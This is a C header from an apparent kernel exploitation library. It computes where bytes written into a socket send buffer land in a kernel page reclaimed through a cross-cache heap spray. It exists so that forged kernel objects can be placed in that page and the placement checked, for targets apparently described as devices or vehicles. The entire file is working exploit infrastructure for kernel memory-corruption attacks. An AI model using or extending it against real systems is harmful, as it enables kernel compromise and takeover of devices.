/* lib/spray/crosscache/skb_payload.h -- where a byte written into a cross-cache
 * refill's send buffer ends up in the reclaimed kernel page.
 *
 * When a freed page is reclaimed as an sk_buff's data, the send buffer does not
 * map one-to-one onto the page: the sk_buff carries a header/headroom, so the
 * bytes that land in the page start at a bias into each order-sized fragment of
 * the send, and the page's kernel address is offset from the leaked object
 * address by a device delta. A byte written at `bias + off` inside a fragment
 * lands at `payload_base + off` in the page.
 *
 * A consumer that writes a forged object into the page, and a judge that reads
 * one field back to check the page landed, must agree on that mapping exactly.
 * This is the one place it lives, so they cannot drift.
 *
 * The caller supplies the geometry (the delta and bias are device/vehicle facts
 * from the target description); this header only does the arithmetic.
 */
#ifndef LIB_SPRAY_CROSSCACHE_SKB_PAYLOAD_H
#define LIB_SPRAY_CROSSCACHE_SKB_PAYLOAD_H

#include <stddef.h>
#include <stdint.h>
#include <string.h>

struct lib_skb_place {
  uintptr_t base;         /* the leaked object address                       */
  uintptr_t payload_base; /* base + delta: where the page's byte 0 maps       */
  size_t bias;            /* offset into each fragment the page data starts at */
  size_t send_size;       /* total send-buffer size                          */
  size_t order_size;      /* one fragment (the reclaimed page order size)    */
};

static inline void lib_skb_place_init(struct lib_skb_place *sp, uintptr_t base,
                                      long delta, size_t bias, size_t send_size,
                                      size_t order_size) {
  sp->base = base;
  sp->payload_base = base + (uintptr_t)delta;
  sp->bias = bias;
  sp->send_size = send_size;
  sp->order_size = order_size;
}

/* The kernel address a field written at page offset `off` will occupy. */
static inline uintptr_t lib_skb_place_addr(const struct lib_skb_place *sp,
                                           size_t off) {
  return sp->payload_base + off;
}

/* The write pointer inside `send_buf` for fragment `chunk`'s page data. */
static inline unsigned char *lib_skb_place_frag(const struct lib_skb_place *sp,
                                                void *send_buf, size_t chunk) {
  return (unsigned char *)send_buf + chunk + sp->bias;
}

/* Write `val` at page offset `off` in EVERY fragment of the send buffer, so
 * whichever fragment reclaims the target page carries it at payload_base+off.
 * Used both by a forge (to place a field) and by a bench (to place a stamp). */
static inline void lib_skb_place_put64(const struct lib_skb_place *sp,
                                       void *send_buf, size_t off,
                                       uint64_t val) {
  for (size_t chunk = 0; chunk + sp->bias + off + sizeof(val) <= sp->send_size;
       chunk += sp->order_size) {
    memcpy(lib_skb_place_frag(sp, send_buf, chunk) + off, &val, sizeof(val));
  }
}

#endif /* LIB_SPRAY_CROSSCACHE_SKB_PAYLOAD_H */
